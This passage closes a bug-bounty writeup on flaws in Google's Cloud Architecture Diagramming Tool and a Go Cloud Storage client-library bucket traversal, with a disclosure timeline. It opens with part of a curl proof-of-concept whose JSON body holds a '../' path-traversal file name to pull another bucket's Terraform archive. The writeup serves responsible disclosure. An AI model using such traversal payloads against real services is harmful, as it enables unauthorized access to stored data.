  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'origin: https://googlecloudcheatsheet.withgoogle.com' \
  -H 'referer: https://googlecloudcheatsheet.withgoogle.com/' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
  --data-binary @- << EOF
  {
    "file_name": "../adt-tf-artifacts/38cd6c1f-907f-45f7-a355-df1b94eb88eb/adt-terraform.zip",
    "key": "qvOJmj9wd8JqGldBGCkT7cowpIIThMWapXWNd5TaC4YOArYPvNXizQCbIdVSFoPeH1wpYNCxV8z5QpowCSTy7sQV8m9oyQQ4NKXmP9nEXeUaspIM17BmBvampAB8l9B5"
  }
EOF > 38cd6c1f-907f-45f7-a355-df1b94eb88eb.zip
```

Below is the recording which I sent to the Google VRP Team:

<p align="center">
<a href="https://drive.google.com/file/d/1OG3uQfGv1PBVmiBmt7FeKfx8ZOqEdNMK/preview" target="_blank">
  <img src="https://lh3.googleusercontent.com/d/1OG3uQfGv1PBVmiBmt7FeKfx8ZOqEdNMK=w1000"/>
</a>
</p>

The reported attack scenario was a breach of a significant security boundary and eventually got classified as `"unrestricted file system or database access"`

> Careful reader probably realized that this vulnerability was introdcuded alongside the mitigation desribed in [Surprising bypass](#surprising-bypass) - it didn't exist beforehand (!)

## Stumbling on an N-day in Go Cloud Storage client library
While I initially pointed the blame to classic AppSec shortcomings (mostly lack of input validation) it soon occured to me that the **client library itself should've prevented this attack scenario**.

One could reasonably postulate a following [security invariant](https://alsmola.medium.com/security-invariants-or-gtfo-d7db2950f95):

_For a given instance of `client.Bucket({bucket}).Object({object}).NewReader(ctx)`, no value of `{object}` should result in a download from a Bucket != `{bucket}`_

Here's the followup email which I sent a few days after my initial submission:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/go_storage_bucket_traversal.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/go_storage_bucket_traversal.png"/>
</a>
</p>

And here's the fix, which I don't believe was security driven:
<p align="center">
<a href="https://github.com/googleapis/google-cloud-go/commit/6b7b21f8a334b6ad3a25e1f66ae1265b4d1f0995
" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/path_traversal_fix.png"/>
</a>
</p>

> ⚠️ PSA: if your application still uses [cloud.google.com/go/storage](https://pkg.go.dev/cloud.google.com/go/storage) version < `1.31.0`, then I'd strongly encourage to upgrade!

## Attack scenario diagram #4

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/attack_scenraio_diagram_num_4.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/attack_scenraio_diagram_num_4.png"/>
</a>
</p>

---

# Closing Remarks
In retrospect, following the inutition and curiosity proved to be extremly valuable!

From a strictly business standpoint: risk was reduced & bounties were payed out -> KPIs/OKRs achieved 📈

On a more serious note - I learned **a ton** and this expercience reignited my interest in the offensive side of security.

What's more, I ended up presenting a talk about this entire scenario during [The Hack Summit](https://thehacksummit.com/en/#agenda) 2024 (!) ([slides](https://speakerdeck.com/jdomeracki/sketchy_cheat_sheet))

Last but not least. I'd like to thank:
- my colleagues @ [Egnyte](https://www.egnyte.com/) who supported me along the way 
- Google Security Team for their open-mindedness & willingnes to proofread this writeup!
- my Mom who patiently endured my excited phone calls 💖

---

# Full timeline
Nov 22, 2023: Initial submission of [issu.ee/312687013](https://issuetracker.google.com/issues/312687013)\
Nov 22, 2023: *Status: Won't Fix (Not Reproducible)*\
Nov 23, 2023: Clarification + full PoC\
Nov 23, 2023: 🎉 Nice catch! (P2,S2)\
Nov 28, 2023: Submitted report on the misconfigured Firebase Cloud Storage bucket allowing read & write operations [issu.ee/313685590](https://issuetracker.google.com/issues/313685590)\
Nov 30, 2023: 🎉 Nice catch! (P2,S2)\
Dec 27, 2023: [issu.ee/313685590](https://issuetracker.google.com/issues/313685590) status changed to `fixed`\
Mar 16, 2024: Found out that the bucket is still publicly readable & writable\
Mar 20, 2024: [issu.ee/313685590](https://issuetracker.google.com/issues/313685590) got reopened & assigned\
Mar 28, 2024: VRP Panel decided not to reward monetarly for the second time, but got a coupon for a cool hat instead\
Apr 06, 2024: Reported a bypass of the mitigation introduced somewhen in Q1 2024 and submitted a new report [issu.ee/333194226](https://issuetracker.google.com/issues/333194226)\
Apr 10, 2024: 🎉 Nice catch! (P2,S2)\
Jun 15, 2024: Ability to overwrite deployable architectures opens room for RCE in victim's GCP infrastructure [issu.ee/347462501](https://issuetracker.google.com/issues/347462501)\
Jun 26, 2024: 🎉 Nice catch! (P2,S2)\
Jun 26, 2024: Reported anonymous access to a Gerrit instance containing the backend source code [issu.ee/349432799](https://issuetracker.google.com/issues/349432799)\
Jun 27, 2024: Unauthorized access to a GCS bucket containing Terraform artifacts via a misconfigured Cloud Function [issu.ee/349831037](https://issuetracker.google.com/issues/349831037)\
Jun 27, 2024: 🎉 Nice catch! (P1,S1)\
Jul 02, 2024: 🎉 Nice catch! (P2,S2)\
Jul XY, 2024: [https://googlecloudcheatsheet.withgoogle.com/architecture](https://googlecloudcheatsheet.withgoogle.com/architecture) got taken down 🚧\
Oct XY, 2024: Silently EOL-ed 🪦

---

[^1]: [https://cloud.google.com/blog/topics/developers-practitioners/introducing-google-cloud-architecture-diagramming-tool](https://cloud.google.com/blog/topics/developers-practitioners/introducing-google-cloud-architecture-diagramming-tool)
[^2]: [https://www.googlecloudcommunity.com/gc/Tips-Tricks/GCP-Architecture-Diagramming-Tool/td-p/394583](https://www.googlecloudcommunity.com/gc/Tips-Tricks/GCP-Architecture-Diagramming-Tool/td-p/394583)
[^3]: Recent example -> [https://arc.net/blog/CVE-2024-45489-incident-response](https://arc.net/blog/CVE-2024-45489-incident-response), [https://kibty.town/blog/arc/](https://kibty.town/blog/arc/)
[^4]: [https://gerrit-review.googlesource.com/Documentation/access-control.html](https://gerrit-review.googlesource.com/Documentation/access-control.html)
[^5]: Original writeup -> [https://labs.detectify.com/writeups/bypassing-and-exploiting-bucket-upload-policies-and-signed-urls](https://labs.detectify.com/writeups/bypassing-and-exploiting-bucket-upload-policies-and-signed-urls)
[^6]: [BBRE videoblog](https://youtu.be/AQ-iEqdepA4) describing the by [Grzegorz Niedziela aka gregxsunday](https://twitter.com/gregxsunday)
[^7]: In my opinion Web App pentests of client-side heavy, modern [SPAs](https://developer.mozilla.org/en-US/docs/Glossary/SPA) isn't really [black-box](https://www.checkpoint.com/cyber-hub/cyber-security/what-is-penetration-testing/what-is-black-box-testing/) due to the simple fact that a significant portion of the business logic is exposed
[^8]: This is the default value of [max-keys](https://cloud.google.com/storage/docs/xml-api/reference-headers#maxkeys) and was a limitation which I was not able to bypass (could not add any query paramters)